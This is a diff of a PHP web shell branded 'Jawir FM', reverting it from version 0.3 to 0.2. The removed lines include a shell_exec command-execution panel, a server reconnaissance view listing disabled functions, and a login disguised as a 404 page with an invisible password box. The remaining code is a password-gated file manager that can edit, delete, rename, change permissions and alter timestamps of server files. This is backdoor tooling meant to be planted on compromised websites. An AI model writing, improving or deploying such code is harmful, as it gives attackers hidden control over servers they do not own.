@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.3');
+define('APP_VER', '0.2');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -17,11 +17,10 @@ if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
         $_SESSION['logged_in'] = true; header('Location:'); exit;
     }
-    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow"><style>html,body{margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{font-family:sans-serif}iframe{position:absolute;top:0;left:0;border:none;width:100%;height:100%}</style></head><body><iframe src="//<?php echo $_SERVER["SERVER_NAME"]; ?>/404" id="iframe_id" onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;"></iframe><form method="post"><input type="password" name="password" style="background: transparent; border: none; color: transparent; caret-color: transparent; padding: 0.5rem;"> <button style="display:none">Login</button></form></body></html>'; exit;
+    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
 }
 
 // Path
-$action = isset($_GET['action']) ? $_GET['action'] : 'filemanager';
 $path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
 if (!$path || !is_dir($path)) $path = getcwd();
 $parent = dirname($path);
@@ -39,12 +38,7 @@ $search = isset($_GET['search']) ? $_GET['search'] : '';
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
         $self = basename(__FILE__);
-        if($action=='command' && isset($_POST['cmd'])){
-            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}else{$output="Server function disabled!";}
-            echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
-            exit;
-        }
-        elseif (isset($_POST['get_content'])) {
+        if (isset($_POST['get_content'])) {
             $f = basename($_POST['get_content']);
             if ($f == $self) {
                 echo 'Author @willygoid';
@@ -155,7 +149,9 @@ $sort_func = function($a, $b) use ($sort, $order) {
             return ($a['mtime'] == $b['mtime']) ? 0 : (($a['mtime'] > $b['mtime']) ? -1 : 1);
         }
     } else {
-        return ($order == 'asc') ? strcasecmp($a['name'], $b['name']) : strcasecmp($b['name'], $a['name']);
+        return ($order == 'asc') 
+            ? strcasecmp($a['name'], $b['name']) 
+            : strcasecmp($b['name'], $a['name']);
     }
 };
 usort($folders,$sort_func); usort($regular_files,$sort_func);
@@ -177,17 +173,6 @@ foreach ($parts as $part) {
 // Goto Dir
 $self_dir = dirname(realpath(__FILE__));
 $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
-
-//Server info
-function getServerInfo(){
-    return [
-        'OS' => php_uname(),
-        'PHP Version' => PHP_VERSION,
-        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
-        'Disabled Functions' => ini_get('disable_functions'),
-        'Loaded Extensions' => implode(', ', get_loaded_extensions()),
-    ];
-}
 ?>
 <!DOCTYPE html>
 <html>
@@ -202,13 +187,14 @@ body.dark table { background-color: #1f2937; color: #f3f4f6; }
 body.dark table tr { border-color: #374151; }
 body.dark .bg-gray-200 { background-color: #374151 !important; }
 body.dark .bg-white { background-color: #1f2937 !important; color: #f3f4f6; }
-body.dark input, body.dark textarea, body.dark select {background-color: #374151 !important; color: #f3f4f6;}
+body.dark input, body.dark textarea, body.dark select {
+  background-color: #374151 !important; color: #f3f4f6;
+}
 body.dark .border { border-color: #4b5563 !important; }
 body.dark .text-gray-700 { color: #d1d5db !important; }
 body.dark .text-gray-500 { color: #9ca3af !important; }
 body.dark .bg-gray-50 { background-color: #374151 !important; }
 body.dark .bg-gray-300 {background-color: #4b5563 !important; color: #f9fafb !important;}
-body.dark .bg-gray-200 {background-color: #4b5563 !important; color: #f9fafb !important;}
 </style>
 <script>
 $(function(){
@@ -225,25 +211,10 @@ $(function(){
     $('#uploadInput').change(()=>$('#uploadForm').submit());
 });
 </script>
-<script>
-let currentPath = <?=json_encode($path)?>;
-$(function(){
-    $('.menu-btn').click(function(){
-        let act=$(this).data('action');
-        $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
-        $(this).addClass('bg-blue-500 text-white');
-        $('#content').html('<div class="text-center p-4">Loading...</div>');
-        let path = encodeURIComponent(currentPath);
-        $.get('?action='+act,function(d){ $('#content').html(d); });
-    });
-    // on load, highlight active
-    $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
-});
-</script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 </head>
-<body id="content" class="bg-gray-100">
+<body class="bg-gray-100">
 <header class="container mx-auto flex items-center justify-between p-4">
     <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
         <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Jawir FM</h1>
@@ -252,11 +223,6 @@ $(function(){
         <img alt="Logo App" class="h-8 md:h-12" src="//sga-cdn-hxg6b2d7ctb2c0eu.z02.azurefd.net/agent-websites/319/medialibrary/images/319_756a1e4ed5294e85a8c61f1031637228.webp"/>
     </a>
 </header>
-<div class="container mx-auto flex space-x-2 mb-4">
-    <button data-action="filemanager" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📁 File Manager</button>
-    <button data-action="serverinfo" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💻 Server Info</button>
-    <button data-action="command" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💡 Command</button>
-</div>
 <main role="main" class="container mx-auto mb-4">
 <nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
   <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
@@ -277,37 +243,13 @@ $(function(){
         <?=htmlspecialchars($crumb['name'])?>
       </a>
       <?php else: ?>
-      <span class="ms-1 text-sm font-medium <?=is_writable($crumb['path'])?'text-green-500':'text-red-500'?> md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
+      <span class="ms-1 text-sm font-medium text-gray-500 md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
       <?php endif;?>
     </li>
     <?php endforeach; ?>
   </ol>
 </nav>
 </main>
-<?php
-if($action=='serverinfo'):
-    $info=getServerInfo(); ?>
-    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
-    <h2 class="text-xl font-bold mb-2">💻 Server Info</h2>
-    <ul class="list-disc pl-5">
-    <?php foreach($info as $k=>$v): ?>
-    <li><span class="font-semibold"><?=htmlspecialchars($k)?>:</span> <span class="text-gray-700"><?=htmlspecialchars($v)?></span></li>
-    <?php endforeach; ?>
-    </ul>
-    </div>
-
-<?php elseif($action=='command'): ?>
-    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
-    <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
-    <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
-    <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
-    <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
-    </form>
-    <div id="output" class="mt-2 text-sm"></div>
-    </div>
-
-<?php else: ?>
-
 <div class="container mx-auto p-4 bg-white rounded-lg shadow">
     <div class="flex justify-between mb-4">
     <div class="flex space-x-2">
@@ -357,7 +299,7 @@ if($action=='serverinfo'):
     <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
-    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-gray-200 text-base'?>"><?=$f['perm']?></button></td>
+    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline text-blue-500"><?=$f['perm']?></button></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
     <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
     </table>
@@ -406,15 +348,6 @@ if($action=='serverinfo'):
 <input name="perm_value" class="border px-2 mb-2" placeholder="e.g. 755">
 <div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">🔧 Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
 
-<?php if(isset($_SESSION['msg'])): ?>
-<script>
-toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
-toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
-</script>
-<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
-
-<?php endif;?>
-
 <footer class="container mx-auto p-4">
       <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
         <div class="flex-grow lg:w-1/2 text-gray-600">
@@ -424,6 +357,14 @@ toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($
         </div>
       </div>
 </footer>
+
+<?php if(isset($_SESSION['msg'])): ?>
+<script>
+toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
+toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
+</script>
+<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
+
 <script>
 $(function(){
   $('#toggleTheme').click(function(){
